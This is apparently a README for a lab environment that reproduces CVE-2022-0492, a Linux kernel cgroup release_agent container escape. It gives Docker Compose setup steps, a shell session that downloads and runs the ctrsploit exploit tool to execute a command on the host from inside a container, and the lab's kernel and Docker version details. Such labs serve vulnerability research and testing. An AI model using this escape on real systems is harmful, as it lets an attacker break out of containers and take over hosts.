# kernel cgroups cve-2022-0492

* dqd:
  * ssst0n3/docker_archive:cve-2022-0492 -> ssst0n3/docker_archive:cve-2022-0492_v0.1.0
  * ssst0n3/docker_archive:cve-2022-0492_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_cve-2022-0492 -> ssst0n3/docker_archive:ctr_cve-2022-0492_v0.1.0
  * ssst0n3/docker_archive:ctr_cve-2022-0492_v0.1.0

## usage

```shell
$ cd vul/cve-2022-0492
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

### reproduce

```shell
root@cve-2022-0492:~# docker run -ti --security-opt apparmor=unconfined --security-opt seccomp=unconfined ubuntu
root@81cdb4d5f4cd:/# wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
root@81cdb4d5f4cd:/# chmod +x /usr/bin/ctrsploit
root@81cdb4d5f4cd:/# ctrsploit vul 0492 c  
INFO[0000] mount cgroup/rdma to /tmp/cgrp217076192      
INFO[0000] echo 1 > /tmp/cgrp217076192/release_agent    
INFO[0000] umount /tmp/cgrp217076192                    
INFO[0000] rm -rf /tmp/cgrp217076192                    
[Y]  cve-2022-0492	# Container escape using cgroup's release agent without CAP_SYS_ADMIN if kernel has CVE-2022-0492
root@81cdb4d5f4cd:/# ctrsploit vul 0492 x -c 'docker ps -a'
INFO[0000] mount cgroup/rdma to /tmp/cgrp591048816      
INFO[0000] echo 1 > /tmp/cgrp591048816/release_agent    
INFO[0000] umount /tmp/cgrp591048816                    
INFO[0000] rm -rf /tmp/cgrp591048816                    
INFO[0000] overwrite payload to /etc/hosts              
INFO[0000] mount cgroup/rdma to /tmp/cgrp764977257      
INFO[0000] invoke notify_on_release: echo 1 > /tmp/cgrp764977257/x/notify_on_release 
INFO[0000] create release_agent: /tmp/cgrp764977257/release_agent 
INFO[0000] umount /tmp/cgrp764977257                    
INFO[0000] rm -rf /tmp/cgrp764977257                    
INFO[0000] recover /etc/hosts                           
INFO[0000] result:
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
81cdb4d5f4cd        ubuntu              "/bin/bash"         41 minutes ago      Up 41 minutes                           friendly_engelbart
```

### env details

```shell
root@cve-2022-0492:~# uname -a
Linux cve-2022-0492 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
root@cve-2022-0492:~# cat /etc/os-release 
NAME="Ubuntu"
VERSION="20.04.6 LTS (Focal Fossa)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 20.04.6 LTS"
VERSION_ID="20.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=focal
UBUNTU_CODENAME=focal
root@cve-2022-0492:~# docker info
Client:
 Debug Mode: false

Server:
 Containers: 0
  Running: 0
  Paused: 0
  Stopped: 0
 Images: 0
 Server Version: 19.03.13
 Storage Driver: overlay2
  Backing Filesystem: extfs
  Supports d_type: true
  Native Overlay Diff: true
 Logging Driver: json-file
 Cgroup Driver: cgroupfs
 Plugins:
  Volume: local
  Network: bridge host ipvlan macvlan null overlay
  Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog
 Swarm: inactive
 Runtimes: runc
 Default Runtime: runc
 Init Binary: docker-init
 containerd version: 8fba4e9a7d01810a393d5d25a3621dc101981175
 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd
 init version: fec3683
 Security Options:
  apparmor
  seccomp
   Profile: default
 Kernel Version: 5.4.0-100-generic
 Operating System: Ubuntu 20.04.6 LTS
 OSType: linux
 Architecture: x86_64
 CPUs: 2
 Total Memory: 1.937GiB
 Name: cve-2022-0492
 ID: GNKT:I4CT:GWUW:MCCJ:QSLS:RPDM:R5PO:CGYT:TNX3:EQH6:TY5C:5FTZ
 Docker Root Dir: /var/lib/docker
 Debug Mode: false
 Registry: https://index.docker.io/v1/
 Labels:
 Experimental: false
 Insecure Registries:
  127.0.0.0/8
 Live Restore Enabled: false

WARNING: No swap limit support
root@cve-2022-0492:~# containerd --version
containerd containerd.io 1.3.7 8fba4e9a7d01810a393d5d25a3621dc101981175
root@cve-2022-0492:~# runc --version
runc version 1.0.0-rc10
commit: dc9208a3303feef5b3839f4323d9beb36df0a9dd
spec: 1.0.1-dev
```

## build

```shell
make all DIR=vul/cve-2022-0492
```


for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_cve-2022-0492_v0.1.0
```
